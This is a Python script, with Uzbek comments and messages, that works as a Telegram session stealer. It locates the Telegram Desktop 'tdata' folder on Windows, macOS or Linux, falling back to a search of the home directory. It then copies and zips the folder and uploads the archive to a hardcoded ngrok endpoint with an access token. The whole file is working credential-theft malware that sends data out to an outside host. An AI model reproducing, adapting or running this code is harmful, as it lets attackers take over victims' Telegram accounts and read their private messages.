import requests
import os
import sys
import time
import shutil
import tempfile
import platform
from pathlib import Path


NGROK_URL = "https://0881-84-54-73-86.ngrok-free.app"
TOKEN = "28a6d19e"

UPLOAD_ENDPOINT = f"{NGROK_URL}/?token={TOKEN}"



def prepare_folder(folder_path):
    source = Path(folder_path).expanduser().resolve()

    if not source.exists():
        raise FileNotFoundError(f"Topilmadi: {source}")

    if not source.is_dir():
        raise ValueError(f"Bu papka emas: {source}")

    # Alohida vaqtinchalik katalog yaratamiz
    temp_dir = Path(tempfile.mkdtemp(prefix="upload_"))

    def safe_copy(src, dst):
        try:
            shutil.copy2(src, dst)
        except Exception:
            # Qulflangan yoki ruxsat yo'q fayllarni indamasdan tashlab o'tib ketadi
            pass

    try:
        # Original papkaga tegmasdan nusxa olamiz
        copied_folder = temp_dir / source.name

        shutil.copytree(
            source,
            copied_folder,
            copy_function=safe_copy,
            ignore_dangling_symlinks=True
        )

        # Nusxani ZIP qilamiz
        zip_base = temp_dir / source.name
        zip_path = Path(
            shutil.make_archive(
                str(zip_base),
                "zip",
                root_dir=temp_dir,
                base_dir=source.name
            )
        )

        return zip_path, temp_dir

    except shutil.Error:
        # Ba'zan papkalarni o'zida ham Error bersa, baribir zipni yasab ko'ramiz
        zip_base = temp_dir / source.name
        zip_path = Path(
            shutil.make_archive(
                str(zip_base),
                "zip",
                root_dir=temp_dir,
                base_dir=source.name
            )
        )
        return zip_path, temp_dir
    except Exception:
        shutil.rmtree(temp_dir, ignore_errors=True)
        raise


def cleanup(temp_dir):
    shutil.rmtree(temp_dir, ignore_errors=True)


def upload_zip(zip_path):
    zip_path = Path(zip_path).expanduser().resolve()

    if not zip_path.is_file():
        print(f"[XATO] ZIP fayl topilmadi: {zip_path}")
        return False

    print(f"[INFO] ZIP yuborilmoqda: {zip_path}")

    try:
        with open(zip_path, "rb") as f:
            response = requests.post(
                UPLOAD_ENDPOINT,
                files={
                    "files": (
                        zip_path.name,
                        f,
                        "application/zip"
                    )
                },
                timeout=60
            )

        if response.status_code == 200:
            print("[OK] ZIP muvaffaqiyatli yuborildi.")
            print(response.text)
            return True

        print(
            f"[XATO] Server javobi: "
            f"{response.status_code} - {response.text}"
        )
        return False

    except Exception as e:
        print(f"[XATO] Upload xatosi: {e}")
        return False

def find_tdata():
    system = platform.system()
    home = Path.home()

    # Tizimga xos odatiy joylar
    possible_paths = []

    if system == "Windows":
        # Windows muhit o'zgaruvchilari orqali aniqroq topamiz
        appdata = os.environ.get("APPDATA", str(home / "AppData" / "Roaming"))
        localappdata = os.environ.get("LOCALAPPDATA", str(home / "AppData" / "Local"))

        possible_paths = [
            Path(appdata) / "Telegram Desktop" / "tdata",
            Path(localappdata) / "Telegram Desktop" / "tdata",
        ]
        
        # Microsoft Store orqali o'rnatilgan bo'lsa:
        packages_dir = Path(localappdata) / "Packages"
        if packages_dir.exists():
            try:
                for tg_folder in packages_dir.glob("TelegramMessengerLLP*"):
                    possible_paths.append(tg_folder / "LocalCache" / "Roaming" / "Telegram Desktop" / "tdata")
                    possible_paths.append(tg_folder / "LocalState" / "tdata")
            except Exception:
                pass

    elif system == "Darwin":  # macOS
        possible_paths = [
            home / "Library" / "Application Support"
            / "Telegram Desktop" / "tdata",

            home / "Library" / "Containers"
            / "org.telegram.desktop" / "Data"
            / "Library" / "Application Support"
            / "Telegram Desktop" / "tdata",
        ]

    elif system == "Linux":
        possible_paths = [
            home / ".local" / "share"
            / "TelegramDesktop" / "tdata",

            home / ".TelegramDesktop" / "tdata",
        ]

    # 1. Avval standart joylarni tekshiramiz
    for path in possible_paths:
        if path.is_dir():
            return path.resolve()

    # 2. Topilmasa home ichidan qidiramiz
    print("Standart joydan topilmadi.")
    print("Home katalogidan qidiryapman...")

    try:
        for path in home.rglob("tdata"):
            if (
                path.is_dir()
                and path.parent.name in (
                    "Telegram Desktop",
                    "TelegramDesktop"
                )
            ):
                return path.resolve()

    except PermissionError:
        pass

    return None




if __name__ == "__main__":

    path=find_tdata()

    if not path:
        print("❌ Xato: Telegram tdata papkasi avtomatik topilmadi!")
        input("Dasturdan chiqish uchun Enter tugmasini bosing...")
        sys.exit(1)

    try:
        zip_file, temp_dir = prepare_folder(path)

        print(f"✅ Vaqtinchalik ZIP tayyor:")
        print(zip_file)
        upload_zip(zip_file)

        cleanup(temp_dir)
        print("✅ Tozalandi.")
        input("Dastur tugadi, chiqish uchun Enter tugmasini bosing...")

    except Exception as e:
        print(f"❌ Xatolik yuz berdi: {e}")
        input("Dasturdan chiqish uchun Enter tugmasini bosing...")